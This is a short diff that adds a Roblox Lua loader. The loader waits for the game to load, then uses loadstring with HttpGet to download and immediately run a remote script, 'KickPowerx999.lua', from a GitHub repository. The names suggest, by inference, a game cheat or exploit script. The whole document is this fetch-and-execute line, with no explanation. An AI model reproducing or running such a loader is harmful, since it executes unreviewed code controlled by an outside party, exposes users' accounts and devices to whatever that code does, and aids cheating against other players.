@@ -1,1 +1,2 @@
-
+repeat task.wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fifa08865/ROBLOOD/refs/heads/main/Kick%20/KickPowerx999.lua"))()
